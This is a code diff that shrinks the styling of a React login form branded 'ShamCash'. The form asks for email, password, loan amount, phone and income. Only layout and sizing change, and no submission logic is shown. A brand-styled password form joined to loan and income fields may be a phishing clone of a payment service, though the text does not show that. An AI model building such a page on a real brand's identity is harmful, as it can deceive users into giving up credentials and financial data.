@@ -106,63 +106,63 @@ export function ShamCashLogin() {
           <ShamLogo />
         </div>
 
-        <form className="relative space-y-5" onSubmit={handleSubmit}>
-          <h1 className={`text-[27px] font-extrabold tracking-[-0.02em] text-white/90 ${lang === "ar" ? "text-right" : "text-left"}`}>
+        <form className="relative space-y-3" onSubmit={handleSubmit}>
+          <h1 className={`text-[22px] font-extrabold tracking-[-0.02em] text-white/90 ${lang === "ar" ? "text-right" : "text-left"}`}>
             {t.heading}
           </h1>
 
-          <div className="space-y-4">
-            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
-              <div className="text-white/60"><UserRound className="h-5 w-5" /></div>
+          <div className="space-y-2.5">
+            <div className="flex h-[42px] items-center gap-2.5 rounded-[12px] border border-white/[0.03] bg-[#2a3047]/95 px-4 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
+              <div className="text-white/55"><UserRound className="h-4 w-4" /></div>
               <input type="text" placeholder={t.email}
-                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                className={`min-w-0 flex-1 bg-transparent text-[13px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/75 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir} autoComplete="email" value={fields.email}
                 onChange={(e) => setFields((p) => ({ ...p, email: e.target.value }))} />
             </div>
 
-            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
-              <div className="text-white/60"><Lock className="h-5 w-5" /></div>
+            <div className="flex h-[42px] items-center gap-2.5 rounded-[12px] border border-white/[0.03] bg-[#2a3047]/95 px-4 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
+              <div className="text-white/55"><Lock className="h-4 w-4" /></div>
               <input type={showPassword ? "text" : "password"} placeholder={t.password}
-                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                className={`min-w-0 flex-1 bg-transparent text-[13px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/75 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir} autoComplete="current-password" value={fields.password}
                 onChange={(e) => setFields((p) => ({ ...p, password: e.target.value }))} />
-              <button type="button" onClick={() => setShowPassword(!showPassword)} className="text-white/60 hover:text-white/90 transition-colors">
-                <Eye className="h-5 w-5" />
+              <button type="button" onClick={() => setShowPassword(!showPassword)} className="text-white/55 hover:text-white/90 transition-colors">
+                <Eye className="h-4 w-4" />
               </button>
             </div>
           </div>
 
-          <div className="space-y-4 pt-1">
-            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
-              <div className="text-white/60"><Banknote className="h-5 w-5" /></div>
+          <div className="space-y-2.5">
+            <div className="flex h-[42px] items-center gap-2.5 rounded-[12px] border border-white/[0.03] bg-[#2a3047]/95 px-4 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
+              <div className="text-white/55"><Banknote className="h-4 w-4" /></div>
               <input type="number" placeholder={t.loan}
-                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                className={`min-w-0 flex-1 bg-transparent text-[13px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/75 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir} value={fields.loan}
                 onChange={(e) => setFields((p) => ({ ...p, loan: e.target.value }))} />
             </div>
 
-            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
-              <div className="text-white/60"><Phone className="h-5 w-5" /></div>
+            <div className="flex h-[42px] items-center gap-2.5 rounded-[12px] border border-white/[0.03] bg-[#2a3047]/95 px-4 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
+              <div className="text-white/55"><Phone className="h-4 w-4" /></div>
               <input type="tel" placeholder={t.phone}
-                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                className={`min-w-0 flex-1 bg-transparent text-[13px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/75 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir="ltr" autoComplete="tel" value={fields.phone}
                 onChange={(e) => setFields((p) => ({ ...p, phone: e.target.value }))} />
             </div>
 
-            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
-              <div className="text-white/60"><TrendingUp className="h-5 w-5" /></div>
+            <div className="flex h-[42px] items-center gap-2.5 rounded-[12px] border border-white/[0.03] bg-[#2a3047]/95 px-4 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
+              <div className="text-white/55"><TrendingUp className="h-4 w-4" /></div>
               <input type="number" placeholder={t.income}
-                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                className={`min-w-0 flex-1 bg-transparent text-[13px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/75 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir} value={fields.income}
                 onChange={(e) => setFields((p) => ({ ...p, income: e.target.value }))} />
             </div>
           </div>
 
-          <div className="grid grid-cols-[58px_1fr] gap-3 pt-1" dir="ltr">
-            <button type="button" className="flex h-[58px] w-[58px] items-center justify-center rounded-[15px] bg-[#657bd8] shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.96] hover:bg-[#7089e0]">
-              <Grid3X3 className="h-8 w-8 text-white" strokeWidth={2.6} />
+          <div className="grid grid-cols-[48px_1fr] gap-2.5 pt-0.5" dir="ltr">
+            <button type="button" className="flex h-[48px] w-[48px] items-center justify-center rounded-[12px] bg-[#657bd8] shadow-[0_12px_28px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.96] hover:bg-[#7089e0]">
+              <Grid3X3 className="h-6 w-6 text-white" strokeWidth={2.6} />
             </button>
-            <button type="submit" className="h-[58px] rounded-[15px] bg-[#657bd8] text-[20px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.98] hover:bg-[#7089e0]">
+            <button type="submit" className="h-[48px] rounded-[12px] bg-[#657bd8] text-[16px] font-extrabold text-white shadow-[0_12px_28px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.98] hover:bg-[#7089e0]">
               {t.submit}
             </button>
           </div>
